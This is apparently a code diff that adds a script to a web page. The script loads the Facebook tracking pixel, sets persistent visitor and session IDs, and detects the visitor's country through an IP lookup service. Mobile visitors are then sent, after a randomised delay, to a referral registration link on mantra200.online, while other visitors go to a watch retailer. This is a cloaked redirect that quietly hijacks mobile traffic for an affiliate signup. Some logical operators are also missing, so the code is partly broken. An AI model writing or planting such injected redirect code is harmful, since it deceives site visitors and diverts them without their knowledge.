@@ -1,0 +1,194 @@
+<script>
+!function(f,b,e,v,n,t,s){
+ 
+if(f.fbq)return;
+ 
+n=f.fbq=function(){
+n.callMethod ?
+n.callMethod.apply(n,arguments) :
+n.queue.push(arguments)
+};
+ 
+if(!f._fbq)f._fbq=n;
+ 
+n.push=n;
+n.loaded=!0;
+n.version='2.0';
+n.queue=[];
+ 
+t=b.createElement(e);
+t.async=!0;
+t.src=v;
+ 
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s);
+ 
+}(window,document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+ 
+(function(){
+ 
+var PIXEL_ID='1547419423101743';
+ 
+// 📱 MOBILE
+var isMobile=/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
+.test(navigator.userAgent);
+ 
+// 🖥 DEFAULT
+var DESTINATION_URL='https://jamtangan.com';
+ 
+// ⏱️ DELAY
+var REDIRECT_DELAY_MS=
+Math.floor(Math.random()*(900-500+1))+500;
+ 
+// 🔐 RANDOM ID
+function rand(){
+ 
+if(window.crypto && crypto.randomUUID){
+return crypto.randomUUID();
+}
+ 
+return 'id_'+Date.now()+'_'+
+Math.random().toString(36).slice(2,10);
+ 
+}
+ 
+// 🍪 COOKIE
+function setCookie(name,value,days){
+ 
+var d=new Date();
+ 
+d.setTime(d.getTime()+(days*86400000));
+ 
+document.cookie=
+name+'='+encodeURIComponent(value)+
+'; expires='+d.toUTCString()+
+'; path=/';
+ 
+}
+ 
+function getCookie(name){
+ 
+var match=document.cookie.match(
+new RegExp('(?:^|; )'+name+'=([^;]*)')
+);
+ 
+return match ? decodeURIComponent(match[1]) : '';
+ 
+}
+ 
+// 👤 CID
+function ensureCid(){
+ 
+var cid=getCookie('_cid');
+ 
+if(!cid){
+ 
+cid=rand();
+ 
+setCookie('_cid',cid,90);
+ 
+}
+ 
+return cid;
+ 
+}
+ 
+// 🧠 SID
+function ensureSid(){
+ 
+var sid=sessionStorage.getItem('_sid');
+ 
+if(!sid){
+ 
+sid=rand();
+ 
+sessionStorage.setItem('_sid',sid);
+ 
+}
+ 
+return sid;
+ 
+}
+ 
+// 🔗 BUILD URL
+function buildRedirectUrl(){
+ 
+var dest=new URL(DESTINATION_URL);
+ 
+dest.searchParams.set('cid',ensureCid());
+dest.searchParams.set('sid',ensureSid());
+ 
+return dest.toString();
+ 
+}
+ 
+// 🚀 PIXEL
+fbq('init',PIXEL_ID);
+ 
+fbq('track','PageView',{
+ 
+cid:ensureCid(),
+sid:ensureSid()
+ 
+});
+ 
+// 🌍 GEO
+async function detectCountryAndRedirect(){
+ 
+try{
+ 
+const res=await fetch('https://ipapi.co/json/');
+const data=await res.json();
+ 
+var country=(data.country_code  '').toUpperCase();
+ 
+console.log('Detected Country:',country);
+ 
+// 📱 MOBILE
+if(isMobile){
+ 
+// 🇮🇩 🇰🇭
+if(country==='ID'  country==='KH'){
+ 
+DESTINATION_URL=
+'https://www.mantra200.online/register?referral=Sophie889';
+ 
+}
+ 
+// 🌎 OTHER
+else{
+ 
+DESTINATION_URL=
+'https://www.mantra200.online/register?referral=Sophie889';
+ 
+}
+ 
+}
+ 
+}catch(e){
+ 
+// ⚠️ FALLBACK
+if(isMobile){
+ 
+DESTINATION_URL=
+'https://www.mantra200.online/register?referral=Sophie889';
+ 
+}
+ 
+}
+ 
+// 🚀 REDIRECT
+setTimeout(function(){
+ 
+window.location.replace(buildRedirectUrl());
+ 
+},REDIRECT_DELAY_MS);
+ 
+}
+ 
+// 🚀 START
+detectCountryAndRedirect();
+ 
+})();
+</script>
